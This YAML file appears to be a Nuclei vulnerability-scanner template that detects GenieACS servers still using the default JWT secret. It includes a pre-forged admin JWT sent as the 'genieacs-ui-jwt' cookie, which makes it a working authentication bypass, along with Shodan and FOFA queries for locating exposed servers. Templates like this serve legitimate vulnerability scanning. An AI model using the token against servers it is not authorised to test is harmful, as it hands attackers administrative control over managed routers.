http:
- extractors:
  - dsl:
    - "\"JWT Secret \U0001F449 \" + cookie_name + \"=\" + default_jwt_secret"
    type: dsl
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"provision":'
    - '"provisionArgs":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /api/presets/?filter=true HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/*

    Cookie: {{cookie_name}}={{default_jwt_secret}}

    '
id: genieacs-default-jwt
info:
  author: DhiyaneshDK,pussycat0x
  classification:
    cpe: cpe:2.3:a:genieacs:genieacs:*:*:*:*:*:*:*:*
    cwe-id: CWE-798
  description: 'GenieACS, an Auto Configuration Server (ACS) for TR-069 enabled routers
    and similar devices, is vulnerable to authentication bypass due to the use of
    a default JWT secret. During installation, if the default JWT secret "secret"
    is not changed, an attacker can create a JWT token, sign it, and use this token
    to log into the GenieACS UI interface. The attack is carried out by setting a
    cookie named "genieacs-ui-jwt" with its value being the JWT token.

    '
  metadata:
    fofa-query:
    - body="genieacs"
    - icon_hash=-2098066288
    max-request: 1
    product: genieacs
    shodan-query:
    - http.html:"genieacs"
    - http.favicon.hash:-2098066288
    vendor: genieacs
    verified: true
  name: GenieACS - Authentication Bypass (Default JWT Secret)
  reference:
  - https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738
  severity: high
  tags: misconfig,jwt,genieacs,default-jwt,vuln
variables:
  cookie_name: genieacs-ui-jwt
  default_jwt_secret: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c
